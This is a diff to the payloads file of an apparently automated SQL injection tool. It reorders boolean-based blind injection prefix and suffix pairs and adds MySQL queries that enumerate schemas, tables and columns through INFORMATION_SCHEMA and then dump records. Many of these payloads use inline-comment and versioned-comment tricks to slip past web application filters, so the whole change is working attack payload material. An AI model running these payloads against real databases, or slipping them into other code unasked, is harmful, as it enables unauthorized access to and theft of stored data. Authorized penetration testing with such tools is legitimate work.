@@ -224,12 +224,14 @@ PAYLOADS = {
                 "comments": [
                     {"pref": " ", "suf": ""},
                     {"pref": " ", "suf": "-- wXyW"},
-                    {"pref": ") ", "suf": " AND (04586=4586"},
                     {"pref": "' ", "suf": "-- wXyW"},
                     {"pref": '" ', "suf": "-- wXyW"},
                     {"pref": ") ", "suf": "-- wXyW"},
                     {"pref": "') ", "suf": "-- wXyW"},
                     {"pref": '") ', "suf": "-- wXyW"},
+                    {"pref": "' ", "suf": " OR '04586'='4586--"},
+                    {"pref": '" ', "suf": ' OR "04586"="4586--'},
+                    {"pref": ") ", "suf": " AND (04586=4586"},
                     {"pref": ") ", "suf": " OR (04586=4586"},
                     {"pref": "') ", "suf": " AND ('04586'='4586"},
                     {"pref": '") ', "suf": ' AND ("04586"="4586'},
@@ -237,8 +239,6 @@ PAYLOADS = {
                     {"pref": '" ', "suf": ' AND "04586"="4586'},
                     {"pref": "') ", "suf": " OR ('04586'='4586"},
                     {"pref": '") ', "suf": ' OR ("04586"="4586'},
-                    {"pref": "' ", "suf": " OR '04586'='4586--"},
-                    {"pref": '" ', "suf": ' OR "04586"="4586--'},
                 ],
                 "title": "AND boolean-based blind - WHERE or HAVING clause",
                 "vector": "AND [INFERENCE]",
@@ -1752,7 +1752,10 @@ PAYLOADS_DBS_COUNT = {
 
 PAYLOADS_DBS_NAMES = {
     "MySQL": [
+        "(SELECT SCHEMA_NAME FROM(INFORMATION_SCHEMA.SCHEMATA)LIMIT 0,1)",
+        "(SELECT IFNULL(SCHEMA_NAME,0x20) FROM(INFORMATION_SCHEMA.SCHEMATA)LIMIT 0,1)",
         "(SELECT CONCAT(SCHEMA_NAME)FROM(INFORMATION_SCHEMA.SCHEMATA)LIMIT 0,1)",
+        "(SELECT CONCAT/**_**/(SCHEMA_NAME)FROM(INFORMATION_SCHEMA.SCHEMATA)LIMIT 0,1)",
         "(/*!SELECT*//**_**/CONCAT/**_**/(/*!50000SCHEMA_NAME*/)%23/**_**/%0AFROM%23/**_**/%0A(/*!INFORMATION_SCHEMA*/./**_**//*!SCHEMATA*/))LIMIT 0,1",
         "(SELECT CONCAT_WS(0x28,0x7e,SCHEMA_NAME)FROM(INFORMATION_SCHEMA.SCHEMATA)LIMIT 0,1)",
         "(/*!SELECT*/ CONCAT_WS(0x28,0x7e,/*!SCHEMA_NAME*/)FROM(/*!INFORMATION_SCHEMA*/./**_**//*!SCHEMATA*/)LIMIT/**_**/0,1)",
@@ -1817,7 +1820,9 @@ PAYLOADS_TBLS_COUNT = {
 
 PAYLOADS_TBLS_NAMES = {
     "MySQL": [
+        "(SELECT TABLE_NAME FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA={db})LIMIT 0,1)",
         "(SELECT CONCAT(TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA={db})LIMIT 0,1)",
+        "(SELECT CONCAT/**_**/(TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA={db})LIMIT 0,1)",
         "(SELECT CONCAT(TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA LIKE {db})LIMIT 0,1)",
         "(SELECT CONCAT(TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA IN/**_**/({db}))LIMIT 0,1)",
         "(SELECT CONCAT_WS(0x28,0x7e,TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA={db})LIMIT 0,1)",
@@ -1884,9 +1889,13 @@ PAYLOADS_COLS_COUNT = {
 
 PAYLOADS_COLS_NAMES = {
     "MySQL": [
+        "(SELECT COLUMN_NAME FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA={db})AND(TABLE_NAME={tbl})LIMIT 0,1)",
         "(SELECT CONCAT(COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA={db})AND(TABLE_NAME={tbl})LIMIT 0,1)",
+        "(SELECT CONCAT/**_**/(COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA={db})AND(TABLE_NAME={tbl})LIMIT 0,1)",
         "(SELECT CONCAT(COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA LIKE {db})AND(TABLE_NAME LIKE {tbl})LIMIT 0,1)",
+        "(SELECT CONCAT/**_**/(COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA LIKE {db})AND(TABLE_NAME LIKE {tbl})LIMIT 0,1)",
         "(SELECT CONCAT(COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA IN/**_**/({db}))AND(TABLE_NAME IN({tbl}))LIMIT 0,1)",
+        "(SELECT CONCAT/**_**/(COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA IN/**_**/({db}))AND(TABLE_NAME IN({tbl}))LIMIT 0,1)",
         "(SELECT CONCAT_WS(0x28,0x7e,COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA={db})AND(/*!50000TABLE_NAME*/={tbl})LIMIT 0,1)",
         "(/*!SELECT*/ CONCAT_WS(0x28,0x7e,/*!COLUMN_NAME*/)FROM(/*!INFORMATION_SCHEMA*/./**_**//*!COLUMNS*/)/*!50000WHERE*/(TABLE_SCHEMA={db})AND(/*!50000TABLE_NAME*/={tbl})LIMIT/**_**/0,1)",
     ],
@@ -1931,14 +1940,16 @@ PAYLOADS_RECS_COUNT = {
 
 PAYLOADS_RECS_DUMP = {
     "MySQL": [
-        "(SELECT CONCAT_WS(0x28,0x7e,{col})FROM({db}.`{tbl}`)LIMIT 0,1)",
-        "(SELECT CONCAT({col}) FROM {db}.{tbl} LIMIT 0,1)",
-        "(/*!50000SELECT*/ CONCAT/**_**/(/*!50000{col}*/)/*!50000FROM*/ /*!50000{db}.{tbl}*/ LIMIT 0,1)",
+        "(SELECT {col} FROM {db}.{tbl} LIMIT 0,1)",
         "(SELECT IFNULL({col},0x20) FROM {db}.{tbl} LIMIT 0,1)",
+        "(SELECT CONCAT({col}) FROM {db}.{tbl} LIMIT 0,1)",
+        "(SELECT CONCAT/**_**/({col}) FROM {db}.{tbl} LIMIT 0,1)",
         "(SELECT/**/CONCAT({col})FROM/**/{db}.{tbl}/**/LIMIT/**_**/0,1)",
+        "(/*!50000SELECT*/ CONCAT/**_**/(/*!50000{col}*/)/*!50000FROM*/ /*!50000{db}.{tbl}*/ LIMIT 0,1)",
         "(/*!50000SELECT*//**/CONCAT/**_**/(/*!50000{col}*/)/*!50000FROM*/(/*!50000{db}*/./*!50000`{tbl}`*/)LIMIT/**/0,1)",
         "(/*!50000SELECT*/ CONCAT/**_**/({col})/*!50000FROM*/ /*!50000{db}*/./*!50000{tbl}*/ LIMIT 0,1)",
         "(/*!50000SELECT*//**/CONCAT({col})/*!50000FROM*//**//*!50000{db}*/./*!50000{tbl}*//**/LIMIT/**_**/0,1)",
+        "(SELECT CONCAT_WS(0x28,0x7e,{col})FROM({db}.`{tbl}`)LIMIT 0,1)",
     ],
     "PostgreSQL": [
         "(SELECT {col}::text FROM {db}.{tbl} OFFSET 0 LIMIT 1)",
